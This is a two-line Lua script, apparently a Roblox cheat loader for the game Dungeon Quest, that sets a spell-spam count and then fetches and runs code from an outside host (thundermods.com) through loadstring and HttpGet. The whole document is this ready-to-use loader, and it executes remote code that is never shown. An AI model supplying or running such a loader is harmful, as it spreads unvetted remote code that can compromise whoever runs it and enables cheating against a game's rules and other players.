_G.SpammingTimes = 15 -- how many times it spams the spell
loadstring(game:HttpGet('http://hamiii.thundermods.com/DungeonQuest.txt',true))()